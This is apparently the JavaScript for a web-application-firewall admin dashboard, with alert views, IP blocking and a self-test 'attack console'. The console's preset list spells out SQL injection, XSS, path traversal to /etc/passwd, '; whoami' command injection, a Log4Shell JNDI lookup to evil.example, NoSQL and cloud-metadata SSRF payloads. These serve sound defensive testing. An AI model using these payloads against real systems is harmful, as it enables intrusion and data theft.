(() => {
  'use strict';

  // ---------------------------------------------------------------- constants
  const TYPES = {
    SQLi:              { label: 'SQL injection',  color: 'var(--c-sqli)' },
    XSS:               { label: 'XSS',            color: 'var(--c-xss)' },
    PATH_TRAVERSAL:    { label: 'Path traversal', color: 'var(--c-path)' },
    COMMAND_INJECTION: { label: 'Command injection', color: 'var(--c-cmd)' },
    SSRF:              { label: 'SSRF',           color: 'var(--c-ssrf)' },
    LOG4SHELL:         { label: 'Log4Shell',      color: 'var(--c-log4)' },
    NOSQLI:            { label: 'NoSQL injection', color: 'var(--c-nosql)' },
    OVERSIZED_PAYLOAD: { label: 'Oversized',      color: 'var(--c-size)' },
    RATE_LIMIT:        { label: 'Rate limit',     color: 'var(--c-rate)' },
    BLOCKED_IP:        { label: 'Blocked IP',     color: 'var(--c-block)' },
  };
  const typeInfo = t => TYPES[t] || { label: t, color: 'var(--faint)' };
  // BLOCKED = rejected in enforce mode, DETECTED = logged only in monitor mode.
  const isAttack = a => a.action === 'BLOCKED' || a.action === 'DETECTED';
  const ACTION_LABEL = { BLOCKED: 'Blocked', IP_BLOCKED: 'IP blocked', DETECTED: 'Detected (not blocked)' };
  const REFRESH_MS = 3000;
  const ALERT_FETCH = 500;
  const ALERT_ROWS = 200;

  const PRESETS = [
    { name: 'Benign search',  hint: '200 OK',            method: 'GET',  url: '/api/search?q=laptop' },
    { name: 'SQL injection',  hint: "' OR 1=1 --",       method: 'GET',  url: "/api/search?q=' OR 1=1 --" },
    { name: 'UNION SELECT',   hint: 'data extraction',   method: 'GET',  url: '/api/search?q=1 UNION SELECT username, password FROM users' },
    { name: 'XSS (query)',    hint: '<script>',          method: 'GET',  url: '/api/search?q=<script>alert(1)</script>' },
    { name: 'XSS (body)',     hint: 'onerror=',          method: 'POST', url: '/api/comment', body: '{"text":"<img src=x onerror=alert(1)>"}' },
    { name: 'Path traversal', hint: '../../etc/passwd',  method: 'GET',  url: '/api/file?path=../../etc/passwd' },
    { name: 'Encoded ..%2F',  hint: 'double encoded',    method: 'GET',  url: '/api/file?path=%252e%252e%252fetc%252fpasswd', raw: true },
    { name: 'Command injection', hint: '; whoami',        method: 'GET',  url: '/api/search?q=laptop; whoami' },
    { name: 'Log4Shell',      hint: '${jndi:ldap://...}', method: 'GET',  url: '/api/search?q=${jndi:ldap://evil.example/a}' },
    { name: 'NoSQL injection', hint: '{"$ne": null}',  method: 'POST', url: '/api/comment', body: '{"text":{"$ne":null}}' },
    { name: 'SSRF',           hint: 'cloud metadata',     method: 'GET',  url: '/api/search?q=http://169.254.169.254/latest/meta-data/' },
    { name: 'Oversized body', hint: '12 KB > 10 KB',     method: 'POST', url: '/api/comment', body: '__BIG__' },
  ];

  // ---------------------------------------------------------------- state
  const state = { token: null, config: null, alerts: [], blocked: [], typeFilter: null, search: '', timer: null, preset: 0 };

  // ---------------------------------------------------------------- helpers
  const $ = id => document.getElementById(id);
  const store = {
    get(k) { try { return sessionStorage.getItem(k); } catch { return null; } },
    set(k, v) { try { sessionStorage.setItem(k, v); } catch { /* ignore */ } },
    del(k) { try { sessionStorage.removeItem(k); } catch { /* ignore */ } },
    lget(k) { try { return localStorage.getItem(k); } catch { return null; } },
    lset(k, v) { try { localStorage.setItem(k, v); } catch { /* ignore */ } },
  };

  /** Builds DOM nodes. Text is always set via textContent: alert payloads are attacker-controlled. */
  function el(tag, props = {}, ...children) {
    const node = document.createElement(tag);
    for (const [k, v] of Object.entries(props)) {
      if (v == null) continue;
      if (k === 'class') node.className = v;
      else if (k === 'text') node.textContent = v;
      else if (k === 'style') node.style.cssText = v;
      else if (k.startsWith('on')) node.addEventListener(k.slice(2), v);
      else node.setAttribute(k, v);
    }
    for (const c of children.flat()) {
      if (c == null) continue;
      node.append(c instanceof Node ? c : document.createTextNode(String(c)));
    }
    return node;
  }

  function parseTime(iso) {
    // Java may emit nanoseconds; trim to milliseconds for Date.parse.
    return Date.parse(String(iso).replace(/(\.\d{3})\d+/, '$1'));
  }
  function ago(ms) {
    const s = Math.max(0, Math.round((Date.now() - ms) / 1000));
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    return Math.floor(s / 86400) + 'd ago';
  }
  function until(ms) {
    const s = Math.round((ms - Date.now()) / 1000);
    if (s <= 0) return 'now';
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60), r = s % 60;
    return h ? `${h}h ${m}m` : m ? `${m}m ${r}s` : `${r}s`;
  }
  function duration(sec) {
    if (sec % 3600 === 0) return sec / 3600 + 'h';
    if (sec % 60 === 0) return sec / 60 + ' min';
    return sec + 's';
  }
  function bytes(n) { return n >= 1024 ? (n / 1024).toFixed(n % 1024 ? 1 : 0) + ' KB' : n + ' B'; }

  let toastTimer;
  function toast(msg) {
    const t = $('toast');
    t.textContent = msg;
    t.classList.add('show');
    clearTimeout(toastTimer);
    toastTimer = setTimeout(() => t.classList.remove('show'), 2400);
  }

  function badge(type) {
    const info = typeInfo(type);
    return el('span', { class: 'badge', style: `color:${info.color};border-color:color-mix(in srgb, ${info.color} 35%, transparent)` },
      el('span', { class: 'sw', style: `background:${info.color}` }), info.label);
  }

  // ---------------------------------------------------------------- API
  async function api(path, options = {}) {
    const res = await fetch(path, {
      ...options,
      headers: { 'X-Admin-Token': state.token, ...(options.body ? { 'Content-Type': 'application/json' } : {}), ...(options.headers || {}) },
    });
    if (res.status === 401) { signOut('Token rejected. Sign in again.'); throw new Error('unauthorized'); }
    const data = await res.json().catch(() => ({}));
    if (!res.ok) throw Object.assign(new Error(data.error || data.message || res.statusText), { status: res.status, data });
    return data;
  }

  async function refresh() {
    try {
      const [config, alerts, blocked] = await Promise.all([
        api('/admin/config'),
        api('/admin/alerts?limit=' + ALERT_FETCH),
        api('/admin/blocked-ips'),
      ]);
      state.config = config;
      state.alerts = alerts.alerts || [];
      state.blocked = blocked.blocked_ips || [];
      render();
      setLive(true);
    } catch (e) {
      if (e.message !== 'unauthorized') setLive(false, 'Offline');
    }
  }

  function setLive(ok, text) {
    $('live').classList.toggle('on', ok && $('autoRefresh').checked);
    $('liveText').textContent = text || ($('autoRefresh').checked ? 'Live' : 'Paused');
  }

  function startTimer() {
    stopTimer();
    if ($('autoRefresh').checked) state.timer = setInterval(refresh, REFRESH_MS);
  }
  function stopTimer() { clearInterval(state.timer); state.timer = null; }

  // ---------------------------------------------------------------- render
  function render() {
    renderMode();
    renderLimits();
    renderBanner();
    renderStats();
    renderTimeline();
    renderByType();
    renderBlocked();
    renderAlerts();
  }

  function renderMode() {
    const c = state.config;
    if (!c) return;
    const monitor = c.enforcement === 'MONITOR';
    const btn = $('modeBtn');
    btn.textContent = monitor ? 'Mode: Monitor' : 'Mode: Enforce';
    btn.classList.toggle('mode-monitor', monitor);
    const banner = $('modeBanner');
    banner.classList.toggle('hidden', !monitor);
    if (monitor) {
      banner.replaceChildren(
        el('strong', { text: 'Monitor mode.' }),
        el('span', { text: 'Attacks and rate-limit hits are logged as "Detected" but NOT blocked. Switch to Enforce when the alerts look right.' }),
        el('span', { class: 'spacer' }),
        el('button', { class: 'btn small', text: 'Switch to Enforce', onclick: () => setMode('ENFORCE') }));
    }
  }

  async function setMode(mode) {
    try {
      await api('/admin/mode', { method: 'PUT', body: JSON.stringify({ mode }) });
      toast(mode === 'MONITOR' ? 'Monitor mode: attacks are logged, not blocked' : 'Enforce mode: attacks are blocked');
    } catch (e) {
      if (e.message !== 'unauthorized') toast('Could not change mode');
    }
    refresh();
  }

  function renderLimits() {
    const c = state.config;
    if (!c) return;
    $('limits').replaceChildren(
      c.mode === 'gateway'
        ? el('span', { class: 'chip', style: 'color:var(--accent);border-color:var(--accent)', title: 'Allowed requests are forwarded to this app', text: `Gateway → ${c.upstream}` })
        : el('span', { class: 'chip', text: 'Embedded mode' }),
      el('span', { class: 'chip', text: `${c.rate_limit.max_requests} req / ${duration(c.rate_limit.window_seconds)}` }),
      el('span', { class: 'chip', text: `block after ${c.blocking.max_violations} violations / ${duration(c.blocking.violation_window_seconds)}` }),
      el('span', { class: 'chip', text: `max body ${bytes(c.max_body_size)}` }),
    );
  }

  function renderBanner() {
    const c = state.config;
    if (!c) return;
    const me = state.blocked.find(b => b.ip === c.your_ip);
    const max = c.blocking.max_violations;
    const used = Math.min(c.your_violations, max);
    const banner = $('youBanner');
    banner.className = 'banner ' + (me ? 'bad' : 'ok');
    const meter = el('span', { class: 'meter' + (me ? ' full' : '') },
      Array.from({ length: max }, (_, i) => el('i', { class: (me || i < used) ? 'on' : '' })));
    if (me) {
      banner.replaceChildren(
        el('strong', { text: 'Your IP is blocked.' }),
        el('span', {}, 'SecureGate sees you as ', el('code', { text: c.your_ip }), '. Console requests will get 403 until you unblock it.'),
        el('span', { class: 'spacer' }),
        el('button', { class: 'btn small', text: 'Unblock me', onclick: () => unblock(c.your_ip) }),
      );
    } else {
      banner.replaceChildren(
        el('span', {}, 'SecureGate sees you as ', el('code', { text: c.your_ip })),
        el('span', { class: 'spacer' }),
        el('span', { class: 'muted', text: `Your violations: ${used} / ${max}` }), meter,
      );
    }
  }

  function renderStats() {
    const alerts = state.alerts;
    const hourAgo = Date.now() - 3600_000;
    const hour = alerts.filter(a => isAttack(a) && parseTime(a.timestamp) >= hourAgo);
    const total = alerts.filter(a => isAttack(a)).length;
    $('stTotal').textContent = total + (alerts.length >= ALERT_FETCH ? '+' : '');
    $('stTotalHint').textContent = alerts.length >= ALERT_FETCH ? `latest ${ALERT_FETCH} alerts shown` : 'in the alert log';
    $('stHour').textContent = hour.length;
    const ips = new Set(hour.map(a => a.ip));
    $('stHourHint').textContent = ips.size ? `from ${ips.size} IP${ips.size > 1 ? 's' : ''}` : 'blocked requests';
    $('stBlocked').textContent = state.blocked.length;

    const counts = countByType(alerts.filter(a => isAttack(a) && a.attack_type !== 'BLOCKED_IP'));
    const top = Object.entries(counts).sort((a, b) => b[1] - a[1])[0];
    $('stTop').textContent = top ? typeInfo(top[0]).label : '-';
    $('stTop').style.color = top ? typeInfo(top[0]).color : '';
    $('stTopHint').textContent = top ? `${top[1]} request${top[1] > 1 ? 's' : ''}` : 'no attacks yet';
  }

  function countByType(list) {
    const out = {};
    for (const a of list) out[a.attack_type] = (out[a.attack_type] || 0) + 1;
    return out;
  }

  function renderTimeline() {
    const svg = $('timeline');
    const NS = 'http://www.w3.org/2000/svg';
    const W = svg.clientWidth || 700, H = 190, padL = 28, padB = 20, padT = 8;
    const BUCKETS = 30, minute = 60_000;
    const end = Math.ceil(Date.now() / minute) * minute;
    const start = end - BUCKETS * minute;
    const types = Object.keys(TYPES);
    const buckets = Array.from({ length: BUCKETS }, () => Object.fromEntries(types.map(t => [t, 0])));
    for (const a of state.alerts) {
      if (!isAttack(a)) continue;
      const t = parseTime(a.timestamp);
      if (t < start || t >= end) continue;
      const i = Math.floor((t - start) / minute);
      buckets[i][a.attack_type] = (buckets[i][a.attack_type] || 0) + 1;
    }
    const totals = buckets.map(b => Object.values(b).reduce((s, n) => s + n, 0));
    const maxV = Math.max(4, ...totals);
    const niceMax = Math.ceil(maxV / 4) * 4;

    svg.setAttribute('viewBox', `0 0 ${W} ${H}`);
    svg.replaceChildren();
    const mk = (tag, attrs) => { const n = document.createElementNS(NS, tag); for (const k in attrs) n.setAttribute(k, attrs[k]); return n; };
    const plotH = H - padB - padT, plotW = W - padL;
    for (let g = 0; g <= 4; g++) {
      const y = padT + plotH - (g / 4) * plotH;
      svg.append(mk('line', { x1: padL, x2: W, y1: y, y2: y, class: 'grid' }));
      const lbl = mk('text', { x: padL - 6, y: y + 3, 'text-anchor': 'end', class: 'axis' });
      lbl.textContent = (niceMax / 4) * g;
      svg.append(lbl);
    }
    const bw = plotW / BUCKETS;
    buckets.forEach((b, i) => {
      let y = padT + plotH;
      const x = padL + i * bw + bw * 0.15;
      for (const t of types) {
        const n = b[t];
        if (!n) continue;
        const h = (n / niceMax) * plotH;
        y -= h;
        const r = mk('rect', { x, y, width: bw * 0.7, height: Math.max(h, 1), rx: 2, fill: typeInfo(t).color });
        const title = mk('title', {});
        title.textContent = `${new Date(start + i * minute).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })} · ${typeInfo(t).label}: ${n}`;
        r.append(title);
        svg.append(r);
      }
      if (i % 5 === 0 || i === BUCKETS - 1) {
        const lbl = mk('text', { x: padL + i * bw + bw / 2, y: H - 4, 'text-anchor': 'middle', class: 'axis' });
        const mAgo = BUCKETS - 1 - i;
        lbl.textContent = mAgo === 0 ? 'now' : `-${mAgo}m`;
        svg.append(lbl);
      }
    });
    $('legend').replaceChildren(...types.map(t =>
      el('span', {}, el('span', { class: 'sw', style: `background:${typeInfo(t).color}` }), typeInfo(t).label)));
  }

  function renderByType() {
    const counts = countByType(state.alerts.filter(a => isAttack(a)));
    const entries = Object.keys(TYPES).map(t => [t, counts[t] || 0]);
    const max = Math.max(1, ...entries.map(e => e[1]));
    const total = entries.reduce((s, e) => s + e[1], 0);
    $('byTypeSub').textContent = total ? `${total} blocked` : '';
    $('byType').replaceChildren(...entries.map(([t, n]) =>
      el('div', { class: 'bar-row' },
        el('span', { text: typeInfo(t).label }),
        el('div', { class: 'bar-track' }, el('div', { class: 'bar-fill', style: `width:${(n / max) * 100}%;background:${typeInfo(t).color}` })),
        el('span', { class: 'n', text: n }))));
  }

  function renderBlocked() {
    const rows = state.blocked.map(b => {
      const exp = b.expires_at ? parseTime(b.expires_at) : null;
      const isMe = state.config && b.ip === state.config.your_ip;
      return el('tr', {},
        el('td', { class: 'nowrap' }, el('code', { text: b.ip }), isMe ? el('span', { class: 'faint', text: ' (you)' }) : null),
        el('td', {}, el('div', { text: b.reason }), el('div', { class: 'faint', text: 'blocked ' + ago(parseTime(b.blocked_at)) })),
        el('td', { class: 'nowrap', title: b.expires_at || 'never', text: exp ? 'in ' + until(exp) : 'manual unblock' }),
        el('td', {}, el('button', { class: 'btn small danger', text: 'Unblock', onclick: () => unblock(b.ip) })));
    });
    $('blockedRows').replaceChildren(...rows);
    $('blockedEmpty').classList.toggle('hidden', rows.length > 0);
  }

  function renderAlerts() {
    const present = new Set(state.alerts.map(a => a.attack_type));
    const chips = [el('button', { class: 'fchip' + (state.typeFilter ? '' : ' on'), text: 'All', onclick: () => setFilter(null) })];
    for (const t of Object.keys(TYPES)) {
      if (!present.has(t) && state.typeFilter !== t) continue;
      chips.push(el('button', { class: 'fchip' + (state.typeFilter === t ? ' on' : ''), text: typeInfo(t).label, onclick: () => setFilter(t) }));
    }
    $('typeFilters').replaceChildren(...chips);

    const q = state.search.trim().toLowerCase();
    const list = state.alerts.filter(a =>
      (!state.typeFilter || a.attack_type === state.typeFilter) &&
      (!q || [a.ip, a.endpoint, a.payload, a.attack_type, a.action].some(v => String(v || '').toLowerCase().includes(q))));
    $('alertsSub').textContent = `${list.length} shown${list.length > ALERT_ROWS ? ` (first ${ALERT_ROWS})` : ''}`;

    const rows = list.slice(0, ALERT_ROWS).map(a => {
      const t = parseTime(a.timestamp);
      return el('tr', {},
        el('td', { class: 'nowrap', title: a.timestamp },
          el('div', { text: new Date(t).toLocaleTimeString() }), el('div', { class: 'faint', text: ago(t) })),
        el('td', { class: 'nowrap' }, el('code', { text: a.ip })),
        el('td', {}, badge(a.attack_type)),
        el('td', { class: 'nowrap' }, el('code', { text: a.endpoint })),
        el('td', {}, el('code', { class: 'payload', title: a.payload, text: a.payload })),
        el('td', { class: 'nowrap act-' + a.action, text: ACTION_LABEL[a.action] || a.action }));
    });
    $('alertRows').replaceChildren(...rows);
    $('alertsEmpty').classList.toggle('hidden', rows.length > 0);
    $('alertsEmpty').textContent = state.alerts.length ? 'No alerts match the filter.' : 'No alerts yet. Try the attack console.';
  }

  function setFilter(t) { state.typeFilter = t; renderAlerts(); }

  // ---------------------------------------------------------------- actions
  async function unblock(ip) {
    try {
      await api('/admin/blocked-ips/' + encodeURIComponent(ip), { method: 'DELETE' });
      toast(`Unblocked ${ip}`);
    } catch (e) {
      if (e.message !== 'unauthorized') toast(e.status === 404 ? `${ip} was not blocked` : 'Unblock failed');
    }
    refresh();
  }

  async function block(ip) {
    try {
      await api('/admin/blocked-ips', { method: 'POST', body: JSON.stringify({ ip }) });
      toast(`Blocked ${ip}`);
      $('blockIp').value = '';
    } catch (e) {
      if (e.message !== 'unauthorized') toast(e.message || 'Block failed');
    }
    refresh();
  }

  // ---------------------------------------------------------------- attack console
  /** Percent-encodes query values so the payload reaches SecureGate instead of being rejected by Tomcat. */
  function encodeUrl(url) {
    const i = url.indexOf('?');
    if (i < 0) return url;
    const query = url.slice(i + 1).split('&').map(pair => {
      const eq = pair.indexOf('=');
      if (eq < 0) return encodeURIComponent(pair);
      return encodeURIComponent(pair.slice(0, eq)) + '=' + encodeURIComponent(pair.slice(eq + 1));
    }).join('&');
    return url.slice(0, i + 1) + query;
  }

  function bigBody() {
    const max = state.config ? state.config.max_body_size : 10240;
    return JSON.stringify({ text: 'a'.repeat(max + 2048) });
  }

  function renderPresets() {
    $('presets').replaceChildren(...PRESETS.map((p, i) =>
      el('button', { class: 'preset' + (i === state.preset ? ' on' : ''), onclick: () => selectPreset(i) },
        el('b', { text: p.name }), el('span', { text: p.hint }))));
  }

  function selectPreset(i) {
    state.preset = i;
    const p = PRESETS[i];
    $('reqMethod').value = p.method;
    $('reqUrl').value = p.url;
    $('reqBody').value = p.body === '__BIG__' ? '(generated: ' + bytes((state.config ? state.config.max_body_size : 10240) + 2048) + ' JSON body)' : (p.body || '');
    $('reqBody').readOnly = p.body === '__BIG__';
    syncBody();
    renderPresets();
  }

  function syncBody() { $('reqBody').classList.toggle('hidden', $('reqMethod').value !== 'POST'); }

  async function send() {
    const p = PRESETS[state.preset];
    const method = $('reqMethod').value;
    let url = $('reqUrl').value.trim();
    if (!url.startsWith('/')) url = '/' + url;
    const finalUrl = (p.raw && url === p.url) ? url : encodeUrl(url);
    let body;
    if (method === 'POST') body = (p.body === '__BIG__' && $('reqBody').readOnly) ? bigBody() : $('reqBody').value;

    const btn = $('sendBtn');
    btn.disabled = true;
    const t0 = performance.now();
    try {
      const res = await fetch(finalUrl, {
        method, body,
        headers: method === 'POST' ? { 'Content-Type': 'application/json' } : {},
        credentials: 'omit',
      });
      const text = await res.text();
      let pretty = text;
      try { pretty = JSON.stringify(JSON.parse(text), null, 2); } catch { /* not JSON */ }
      showResponse(res.status, `${method} ${finalUrl.length > 80 ? finalUrl.slice(0, 80) + '…' : finalUrl} · ${Math.round(performance.now() - t0)} ms`, pretty);
    } catch (e) {
      showResponse(0, 'Network error', String(e));
    } finally {
      btn.disabled = false;
      setTimeout(refresh, 150);
    }
  }

  function showResponse(status, meta, body) {
    $('resp').classList.remove('hidden');
    const s = $('respStatus');
    s.textContent = status || 'ERR';
    s.className = 'status ' + (status >= 200 && status < 300 ? 's2' : 's4') + (status === 429 ? ' s429' : '');
    const labels = { 200: 'Allowed', 400: 'Attack blocked', 403: 'IP blocked', 429: 'Rate limited' };
    $('respMeta').textContent = (labels[status] ? labels[status] + ' · ' : '') + meta;
    $('respBody').textContent = body;
  }

  async function burst() {
    const n = (state.config ? state.config.rate_limit.max_requests : 100) + 5;
    const btn = $('burstBtn');
    btn.disabled = true;
    const counts = {};
    let done = 0;
    const one = () => fetch('/api/search?q=burst', { credentials: 'omit' })
      .then(r => r.status).catch(() => 0)
      .then(s => { counts[s] = (counts[s] || 0) + 1; done++; $('burstText').textContent = `Sent ${done} / ${n}…`; });
    for (let i = 0; i < n; i += 20) {
      await Promise.all(Array.from({ length: Math.min(20, n - i) }, one));
    }
    $('burstText').textContent = `Sent ${n} requests: ` +
      Object.entries(counts).sort().map(([s, c]) => `${c} × ${s === '0' ? 'error' : s}`).join(', ') +
      (counts[403] ? '. Each 429 counted as a violation, so your IP got auto-blocked.' : '.');
    btn.disabled = false;
    refresh();
  }

  // ---------------------------------------------------------------- auth & boot
  async function signIn(token) {
    state.token = token;
    try {
      await api('/admin/config');
    } catch (e) {
      if (e.message !== 'unauthorized') $('loginErr').textContent = 'Could not reach SecureGate.';
      return;
    }
    store.set('securegate.token', token);
    $('loginView').classList.add('hidden');
    $('appView').classList.remove('hidden');
    $('topbar').classList.remove('hidden');
    renderPresets();
    selectPreset(state.preset);
    await refresh();
    startTimer();
  }

  function signOut(message) {
    stopTimer();
    state.token = null;
    store.del('securegate.token');
    $('appView').classList.add('hidden');
    $('topbar').classList.add('hidden');
    $('loginView').classList.remove('hidden');
    $('loginErr').textContent = message || '';
    $('tokenInput').value = '';
    $('tokenInput').focus();
  }

  function applyTheme(theme) {
    if (theme) document.documentElement.dataset.theme = theme;
    else delete document.documentElement.dataset.theme;
  }

  $('loginForm').addEventListener('submit', e => { e.preventDefault(); $('loginErr').textContent = ''; signIn($('tokenInput').value); });
  $('modeBtn').addEventListener('click', () => setMode(state.config && state.config.enforcement === 'MONITOR' ? 'ENFORCE' : 'MONITOR'));
  $('logoutBtn').addEventListener('click', () => signOut());
  $('autoRefresh').addEventListener('change', () => { startTimer(); setLive(true); });
  $('reqMethod').addEventListener('change', syncBody);
  $('sendBtn').addEventListener('click', send);
  $('reqUrl').addEventListener('keydown', e => { if (e.key === 'Enter') send(); });
  $('burstBtn').addEventListener('click', burst);
  $('blockForm').addEventListener('submit', e => { e.preventDefault(); const ip = $('blockIp').value.trim(); if (ip) block(ip); });
  $('search').addEventListener('input', e => { state.search = e.target.value; renderAlerts(); });
  $('themeBtn').addEventListener('click', () => {
    const dark = document.documentElement.dataset.theme
      ? document.documentElement.dataset.theme === 'dark'
      : matchMedia('(prefers-color-scheme: dark)').matches;
    const next = dark ? 'light' : 'dark';
    applyTheme(next);
    store.lset('securegate.theme', next);
  });
  document.addEventListener('visibilitychange', () => {
    if (!state.token) return;
    if (document.hidden) stopTimer(); else { refresh(); startTimer(); }
  });
  window.addEventListener('resize', () => { if (state.token) renderTimeline(); });

  applyTheme(store.lget('securegate.theme'));
  const saved = store.get('securegate.token');
  if (saved) signIn(saved); else signOut();
})();
